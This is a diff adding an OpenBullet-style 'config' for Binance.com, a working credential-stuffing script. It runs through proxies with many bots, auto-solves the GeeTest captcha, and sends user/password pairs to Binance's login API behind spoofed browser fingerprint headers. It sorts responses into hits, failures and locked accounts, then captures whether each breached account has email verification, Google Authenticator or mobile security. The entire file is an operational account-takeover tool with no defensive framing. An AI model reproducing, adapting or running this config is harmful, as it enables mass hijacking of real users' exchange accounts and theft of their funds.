@@ -1,0 +1,139 @@
+[SETTINGS]
+{
+  "Name": "Binance.com",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2021-11-15T07:44:27.4517331-05:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "",
+  "Version": "1.1.0 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION Hash MD5 "<PASS>" -> VAR "MPASS" 
+
+FUNCTION Hash SHA512 "<PASS>" -> VAR "SPASS" 
+
+#Time FUNCTION DateToUnixTime "yyyy-MM-dd:HH-mm-ss" Miliseconds -> VAR "TM" 
+
+REQUEST GET "https://accounts.binance.com/bapi/composite/v1/public/common/security/gt-code?t=<TM>" 
+  
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "bnc-uuid: a71cfa32-de30-4b65-a468-a7fdcbb63bb9" 
+  HEADER "clienttype: web" 
+  HEADER "content-type: application/json" 
+  HEADER "device-info: eyJzY3JlZW5fcmVzb2x1dGlvbiI6IjE5MjAsMTA4MCIsImF2YWlsYWJsZV9zY3JlZW5fcmVzb2x1dGlvbiI6IjE5MjAsMTA0MCIsInN5c3RlbV92ZXJzaW9uIjoiV2luZG93cyAxMCIsImJyYW5kX21vZGVsIjoidW5rbm93biIsInN5c3RlbV9sYW5nIjoiZW4tVVMiLCJ0aW1lem9uZSI6IkdNVC01IiwidGltZXpvbmVPZmZzZXQiOjMwMCwidXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS85My4wLjQ1NzcuNjMgU2FmYXJpLzUzNy4zNiBFZGcvOTMuMC45NjEuNDciLCJsaXN0X3BsdWdpbiI6Ik1pY3Jvc29mdCBFZGdlIFBERiBQbHVnaW4sTWljcm9zb2Z0IEVkZ2UgUERGIFZpZXdlcixOYXRpdmUgQ2xpZW50IiwiY2FudmFzX2NvZGUiOiJhNDBkZGEzMiIsIndlYmdsX3ZlbmRvciI6Ikdvb2dsZSBJbmMuIChOVklESUEpIiwid2ViZ2xfcmVuZGVyZXIiOiJBTkdMRSAoTlZJRElBLCBOVklESUEgR2VGb3JjZSBSVFggMjA4MCBUaSBEaXJlY3QzRDExIHZzXzVfMCBwc181XzAsIEQzRDExLTI3LjIxLjE0LjYwODkpIiwiYXVkaW8iOiIxMjQuMDQzNDc1Mjc1MTYwNzQiLCJwbGF0Zm9ybSI6IldpbjMyIiwid2ViX3RpbWV6b25lIjoiQW1lcmljYS9DaGljYWdvIiwiZGV2aWNlX25hbWUiOiJFZGdlIFY5My4wLjk2MS40NyAoV2luZG93cykiLCJmaW5nZXJwcmludCI6IjFmNmI4M2JjMjE3NzI1NDg5YTI0ZmM5NjFiYTJmMzk2IiwiZGV2aWNlX2lkIjoiIiwicmVsYXRlZF9kZXZpY2VfaWRzIjoiIn0=" 
+  HEADER "lang: en" 
+  HEADER "referer: https://accounts.binance.com/en/login" 
+  HEADER "sec-ch-ua: \"Microsoft Edge\";v=\"93\", \" Not;A Brand\";v=\"99\", \"Chromium\";v=\"93\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 Edg/93.0.961.47" 
+  HEADER "x-trace-id: e3cbfe61-1049-4074-baaa-424388f21c76" 
+  HEADER "x-ui-request-trace: e3cbfe61-1049-4074-baaa-424388f21c76" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Retry OR 
+    KEY "<RESPONSECODE>" Contains "404" 
+    KEY "we cannot display this forbidden content" 
+    KEY "Internet Positif" 
+    KEY "<RESPONSECODE>" Contains "403" 
+
+PARSE "<SOURCE>" JSON "challenge" -> VAR "challenge" 
+
+PARSE "<SOURCE>" JSON "gt" -> VAR "gt" 
+
+SOLVECAPTCHA GeeTest "https://accounts.binance.com/en/login" "<gt>" "<challenge>" "api.geetest.com" 
+
+FUNCTION Length "{\"email\":\"<USER>\",\"password\":\"<SPASS>\",\"safePassword\":\"<SPASS>\",\"validateCodeType\":\"gt\",\"geetestChallenge\":\"<GT_CHALLENGE>\",\"geetestValidate\":\"<GT_VALIDATE>\",\"geetestSeccode\":\"<GT_SECCODE>\",\"challenge\":\"\",\"gt\":\"\",\"gtId\":\"\",\"deviceInfo\":\"eyJzY3JlZW5fcmVzb2x1dGlvbiI6IjE5MjAsMTA4MCIsImF2YWlsYWJsZV9zY3JlZW5fcmVzb2x1dGlvbiI6IjE5MjAsMTA0MCIsInN5c3RlbV92ZXJzaW9uIjoiV2luZG93cyAxMCIsImJyYW5kX21vZGVsIjoidW5rbm93biIsInN5c3RlbV9sYW5nIjoiZW4tVVMiLCJ0aW1lem9uZSI6IkdNVC03IiwidGltZXpvbmVPZmZzZXQiOjQyMCwidXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS85My4wLjQ1NzcuNjMgU2FmYXJpLzUzNy4zNiBFZGcvOTMuMC45NjEuNDciLCJsaXN0X3BsdWdpbiI6Ik1pY3Jvc29mdCBFZGdlIFBERiBQbHVnaW4sTWljcm9zb2Z0IEVkZ2UgUERGIFZpZXdlcixOYXRpdmUgQ2xpZW50IiwiY2FudmFzX2NvZGUiOiJhNDBkZGEzMiIsIndlYmdsX3ZlbmRvciI6Ikdvb2dsZSBJbmMuIChOVklESUEpIiwid2ViZ2xfcmVuZGVyZXIiOiJBTkdMRSAoTlZJRElBLCBOVklESUEgR2VGb3JjZSBSVFggMjA4MCBUaSBEaXJlY3QzRDExIHZzXzVfMCBwc181XzAsIEQzRDExLTI3LjIxLjE0LjYwODkpIiwiYXVkaW8iOiIxMjQuMDQzNDc1Mjc1MTYwNzQiLCJwbGF0Zm9ybSI6IldpbjMyIiwid2ViX3RpbWV6b25lIjoiQW1lcmljYS9Mb3NfQW5nZWxlcyIsImRldmljZV9uYW1lIjoiRWRnZSBWOTMuMC45NjEuNDcgKFdpbmRvd3MpIiwiZmluZ2VycHJpbnQiOiIzMmQwZWUyMjE0NTRmMTMxYzlhMjI4MWU0NmEzM2E3MyIsImRldmljZV9pZCI6IiIsInJlbGF0ZWRfZGV2aWNlX2lkcyI6IiJ9\",\"isNewLoginProcess\":true}" -> VAR "LEN" 
+
+REQUEST POST "https://accounts.binance.com/bapi/accounts/v2/public/authcenter/login" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<MPASS>\",\"safePassword\":\"<SPASS>\",\"validateCodeType\":\"gt\",\"geetestChallenge\":\"<GT_CHALLENGE>\",\"geetestValidate\":\"<GT_VALIDATE>\",\"geetestSeccode\":\"<GT_SECCODE>\",\"challenge\":\"\",\"gt\":\"\",\"gtId\":\"\",\"deviceInfo\":\"eyJzY3JlZW5fcmVzb2x1dGlvbiI6IjE5MjAsMTA4MCIsImF2YWlsYWJsZV9zY3JlZW5fcmVzb2x1dGlvbiI6IjE5MjAsMTA0MCIsInN5c3RlbV92ZXJzaW9uIjoiV2luZG93cyAxMCIsImJyYW5kX21vZGVsIjoidW5rbm93biIsInN5c3RlbV9sYW5nIjoiZW4tVVMiLCJ0aW1lem9uZSI6IkdNVC01IiwidGltZXpvbmVPZmZzZXQiOjMwMCwidXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS85My4wLjQ1NzcuNjMgU2FmYXJpLzUzNy4zNiBFZGcvOTMuMC45NjEuNDciLCJsaXN0X3BsdWdpbiI6Ik1pY3Jvc29mdCBFZGdlIFBERiBQbHVnaW4sTWljcm9zb2Z0IEVkZ2UgUERGIFZpZXdlcixOYXRpdmUgQ2xpZW50IiwiY2FudmFzX2NvZGUiOiJhNDBkZGEzMiIsIndlYmdsX3ZlbmRvciI6Ikdvb2dsZSBJbmMuIChOVklESUEpIiwid2ViZ2xfcmVuZGVyZXIiOiJBTkdMRSAoTlZJRElBLCBOVklESUEgR2VGb3JjZSBSVFggMjA4MCBUaSBEaXJlY3QzRDExIHZzXzVfMCBwc181XzAsIEQzRDExLTI3LjIxLjE0LjYwODkpIiwiYXVkaW8iOiIxMjQuMDQzNDc1Mjc1MTYwNzQiLCJwbGF0Zm9ybSI6IldpbjMyIiwid2ViX3RpbWV6b25lIjoiQW1lcmljYS9DaGljYWdvIiwiZGV2aWNlX25hbWUiOiJFZGdlIFY5My4wLjk2MS40NyAoV2luZG93cykiLCJmaW5nZXJwcmludCI6IjFmNmI4M2JjMjE3NzI1NDg5YTI0ZmM5NjFiYTJmMzk2IiwiZGV2aWNlX2lkIjoiIiwicmVsYXRlZF9kZXZpY2VfaWRzIjoiIn0=\",\"isNewLoginProcess\":true}" 
+  CONTENTTYPE "application/json" 
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "bnc-uuid: a71cfa32-de30-4b65-a468-a7fdcbb63bb9" 
+  HEADER "clienttype: web" 
+  HEADER "content-length: <LEN>" 
+  HEADER "content-type: application/json" 
+  HEADER "csrftoken: " 
+  HEADER "device-info: eyJzY3JlZW5fcmVzb2x1dGlvbiI6IjE5MjAsMTA4MCIsImF2YWlsYWJsZV9zY3JlZW5fcmVzb2x1dGlvbiI6IjE5MjAsMTA0MCIsInN5c3RlbV92ZXJzaW9uIjoiV2luZG93cyAxMCIsImJyYW5kX21vZGVsIjoidW5rbm93biIsInN5c3RlbV9sYW5nIjoiZW4tVVMiLCJ0aW1lem9uZSI6IkdNVC01IiwidGltZXpvbmVPZmZzZXQiOjMwMCwidXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS85My4wLjQ1NzcuNjMgU2FmYXJpLzUzNy4zNiBFZGcvOTMuMC45NjEuNDciLCJsaXN0X3BsdWdpbiI6Ik1pY3Jvc29mdCBFZGdlIFBERiBQbHVnaW4sTWljcm9zb2Z0IEVkZ2UgUERGIFZpZXdlcixOYXRpdmUgQ2xpZW50IiwiY2FudmFzX2NvZGUiOiJhNDBkZGEzMiIsIndlYmdsX3ZlbmRvciI6Ikdvb2dsZSBJbmMuIChOVklESUEpIiwid2ViZ2xfcmVuZGVyZXIiOiJBTkdMRSAoTlZJRElBLCBOVklESUEgR2VGb3JjZSBSVFggMjA4MCBUaSBEaXJlY3QzRDExIHZzXzVfMCBwc181XzAsIEQzRDExLTI3LjIxLjE0LjYwODkpIiwiYXVkaW8iOiIxMjQuMDQzNDc1Mjc1MTYwNzQiLCJwbGF0Zm9ybSI6IldpbjMyIiwid2ViX3RpbWV6b25lIjoiQW1lcmljYS9DaGljYWdvIiwiZGV2aWNlX25hbWUiOiJFZGdlIFY5My4wLjk2MS40NyAoV2luZG93cykiLCJmaW5nZXJwcmludCI6IjFmNmI4M2JjMjE3NzI1NDg5YTI0ZmM5NjFiYTJmMzk2IiwiZGV2aWNlX2lkIjoiIiwicmVsYXRlZF9kZXZpY2VfaWRzIjoiIn0=" 
+  HEADER "fvideo-id: 31501dbd1562a0ca808ceb3bbe4b4cda37c34fe0" 
+  HEADER "lang: en" 
+  HEADER "origin: https://accounts.binance.com" 
+  HEADER "referer: https://accounts.binance.com/en/login" 
+  HEADER "sec-ch-ua: \"Microsoft Edge\";v=\"93\", \" Not;A Brand\";v=\"99\", \"Chromium\";v=\"93\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 Edg/93.0.961.47" 
+  HEADER "x-trace-id: 5b30eb3e-20f4-46c3-a7a3-2d211e55a86a" 
+  HEADER "x-ui-request-trace: 5b30eb3e-20f4-46c3-a7a3-2d211e55a86a" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "message\":\"us\"" 
+    KEY "{\"code\":\"000000" 
+    KEY "message\":null" 
+  KEYCHAIN Failure OR 
+    KEY "Incorrect username or password" 
+  KEYCHAIN Retry OR 
+    KEY "Verify failed" 
+    KEY "<RESPONSECODE>" Contains "404" 
+    KEY "we cannot display this forbidden content" 
+    KEY "Internet Positif" 
+    KEY "504" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "The password you entered is incorrect" 
+    KEY "more chances" 
+    KEY "Your password has not been changed for a long time" 
+    KEY "please click 'Forgot Password'" 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "We were unable to activate your account" 
+
+PARSE "<SOURCE>" JSON "emailVerified" CreateEmpty=FALSE -> CAP "EmailVerified" 
+
+PARSE "<SOURCE>" JSON "gauth" CreateEmpty=FALSE -> CAP "GoogleAuth" 
+
+PARSE "<SOURCE>" JSON "mobileSecurity" CreateEmpty=FALSE -> CAP "MobileSecurity" 
+
